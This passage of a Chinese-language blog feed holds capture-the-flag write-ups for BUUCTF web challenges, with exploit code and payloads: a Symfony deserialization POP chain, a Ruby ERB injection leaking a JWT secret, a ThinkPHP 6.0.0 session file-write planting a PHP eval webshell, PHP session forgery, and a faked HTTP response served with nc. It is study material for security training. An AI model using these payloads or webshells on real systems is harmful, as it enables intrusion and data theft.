$f($items);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;pool可控，跟进saveDeferred()方法，同时，在本类中__construct()方法中可以看到$this-&gt;pool要求接口是AdapterInterface，所以找一个Adapterinterface接口并且存在saveDferred方法的类</p><img src="/2020/06/26/taoismf/6.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> === <span class="keyword">$this</span>-&gt;values) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;keys[$item-&gt;getKey()]) &amp;&amp; <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜索CacheItemInterface接口，条件满足继续执行，跟进一下intialize()方法</p><img src="/2020/06/26/taoismf/7.png" class=""><p>这里判断文件是否存在并进行了文件包含</p><p>由于这题涉及到命名空间的东西，并不是很熟悉，pop链是看的guoke师傅的写的</p><p>这里给出exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file=<span class="string">'/flag'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred;</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'xxx'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$a=<span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure><h3 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h3><img src="/2020/06/26/taoismf/8.png" class=""><p>work可以获得钱，但是这个钱是随机的，不可能真的一直点到flag的价格</p><p>看了源码，好像不是用前端js来做</p><p>尝试看看有没有隐藏的信息，robots.txt有隐藏信息，访问，拿到了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">require <span class="string">'sinatra'</span></span><br><span class="line">require <span class="string">'sinatra/cookies'</span></span><br><span class="line">require <span class="string">'sinatra/json'</span></span><br><span class="line">require <span class="string">'jwt'</span></span><br><span class="line">require <span class="string">'securerandom'</span></span><br><span class="line">require <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> do</span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[<span class="string">"SECRET"</span>] , true, &#123; algorithm: <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;uid: auth[<span class="number">0</span>][<span class="string">"uid"</span>],jkl: auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[<span class="string">"SECRET"</span>] , true, &#123; algorithm: <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">  <span class="keyword">if</span> params[:do] == <span class="string">"#&#123;params[:name][0,7]&#125; is working"</span> then</span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('#&#123;params[:name][0,7]&#125; working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line">post <span class="string">"/shop"</span> do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[<span class="string">"SECRET"</span>] , true, &#123; algorithm: <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: <span class="string">"error"</span>,message: <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: <span class="string">"success"</span>,message: <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>包含了jwt，应该和jwt加密有关，核心代码部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> params[:<span class="keyword">do</span>] == <span class="string">"#&#123;params[:name][0,7]&#125; is working"</span> then</span><br><span class="line"></span><br><span class="line">   auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">   auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">   cookies[:auth] = auth</span><br><span class="line">   ERB::new(<span class="string">"&lt;script&gt;alert('#&#123;params[:name][0,7]&#125; working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line"> end</span><br></pre></td></tr></table></figure><p>查资料，好像有Ruby/ERB模板注入，进行测试，可以用ruby的预定义字符$对匹配的字符串进行读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?SERECT&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working</span><br></pre></td></tr></table></figure><img src="/2020/06/26/taoismf/9.png" class=""><p>成功拿到了jwt加密的密钥</p><p>buy flag抓包，进行cookie的替换，cookie的生成通过jwt在线加密</p><img src="/2020/06/26/taoismf/10.png" class=""><p>替换之后，在返回包中有新的cookie，放到网站里解密即可</p><h3 id="GYCTF2020-EasyThinkingPhp"><a href="#GYCTF2020-EasyThinkingPhp" class="headerlink" title="[GYCTF2020]EasyThinkingPhp"></a>[GYCTF2020]EasyThinkingPhp</h3><p>根据题目名，推测是thinkphp的版本漏洞，随便访问一个不存在的路径，爆出thinkphp的版本号</p><img src="/2020/06/26/taoismf/11.png" class=""><p>先注册一个账号，登录的时候抓一下包，看到了一个session</p><p>找一下有关thinkphp6.0.0的版本漏洞，找到了在session启用的条件下创建任意文件和删除任意文件的文章，能够创建任意文件意味着就能写入shell，就能getshell，在setId()的方法中只对session的长度进行了判断，只要符合32位就能够被成功写入session</p><p>修改session为.php结尾的32位长度的文件名，放包，在search页面写入shell，在这之前可以测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><img src="/2020/06/26/taoismf/12.png" class=""><p>成功写入</p><p>接下来就是写入一句话来getshell，再用蚁剑进行连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure><img src="/2020/06/26/taoismf/13.png" class=""><p>到这里还没有结束，这里存在disable_function，不能够直接读取到flag，想到了之前那道RCEME，并且php版本是一样的，上传exp到tmp目录下，修改执行命令</p><img src="/2020/06/26/taoismf/14.png" class=""><p>包含该exp文件</p><img src="/2020/06/26/taoismf/15.png" class=""><h3 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h3><p>开题就给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">"/var/babyctf/"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"/flag"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] =<span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">'direction'</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">"upload"</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">"uploaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">"download"</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'file not exist'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">'Content-Type: application/force-download'</span>);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">"downloaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计：</p><p>开始的时候设置了session的存储路径在/var/babyctf下，开启session，包含了/flag文件。之后判断session中的username的值是否为admin，如果是admin就判断在/var/babyctf/路径下有没有success.txt文件，有得话就删除该文件，显示flag中的内容</p><img src="/2020/06/26/taoismf/16.png" class=""><p>direcetion为upload时，上传的文件的field是up_file,并且文件名后面会拼接上_和该文件的sha256摘要值，上传的文件可控，在本地可以生成对应的sha256的值，判断是否有路径穿越，之后就上传结束</p><img src="/2020/06/26/taoismf/17.png" class=""><p>下载操作，获取要读取的文件名(POST filename参数)，拼接路径，判断是否有路径穿越，返回文件内容。</p><img src="/2020/06/26/taoismf/18.png" class=""><p>思路：伪造session，是username=admin-&gt;创建上传succrss.txt文件-&gt;读取flag</p><p>读取已经存在的文件，返回文件内容如下</p><img src="/2020/06/26/taoismf/19.png" class=""><p>可以看到最前面有着0x08,搜索资料可能是php_binary引擎</p><img src="/2020/06/26/taoismf/20.png" class=""><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_binary'</span>);</span><br><span class="line">session_save_path(<span class="string">"C:\\Users\\60120\\PhpstormProjects\\untitled"</span>);<span class="comment">#生成文件的路径</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = <span class="string">'admin'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在php中将生成的session文件命名为sess,上传</p><img src="/2020/06/26/taoismf/21.png" class=""><p>计算一下sha256的值</p><img src="/2020/06/26/taoismf/22.png" class=""><p>修改cookie中session的值为新生成的值</p><p>下面就是创建success.txt文件，attr为空则直接读取文件内容，这里让attr的值为success.txt就能够成功创建success.txt文件</p><img src="/2020/06/26/taoismf/23.png" class=""><p>上传之后可以读取一下文件看看是否上传成功，之后再刷新一下页面就能够看到flag了</p><img src="/2020/06/26/taoismf/24.png" class=""><h3 id="V-amp-N2020-公开赛-TimeTravel"><a href="#V-amp-N2020-公开赛-TimeTravel" class="headerlink" title="[V&amp;N2020 公开赛]TimeTravel"></a>[V&amp;N2020 公开赛]TimeTravel</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入flag，请求httpapi服务，如果服务返回的是success，那么就执行读取readflag</p><p>传入file，返回file内容</p><p>传入phpinfo，返回phpinfo()</p><p>没有做过这种题，看了赵总的wp，看了给的GitHub链接</p><img src="/2020/06/26/taoismf/25.png" class=""><p>buu上起一台内网机子，写入b.txt(嫖的exp)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.2</span><br><span class="line">Date: Fri, 06 Mar 2020 18:27:31 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>监听端口，nc -lvvp 8888 &lt; b.txt</p><p>postman传入header，刷新一下返回页面拿到flag</p><img src="/2020/06/26/taoismf/26.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj5</title>
      <link href="/2020/06/04/buuoj5/"/>
      <url>/2020/06/04/buuoj5/</url>
      
        <content type="html"><![CDATA[<p>23333，继续<a id="more"></a></p><h3 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h3><p>文件上传，试遍了常规方法，没有进展，发现好像给了提示</p><img src="/2020/06/04/buuoj5/2.png" class=""><p>GitHub搜一下，拿到了源码，看一下三个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">$id = <span 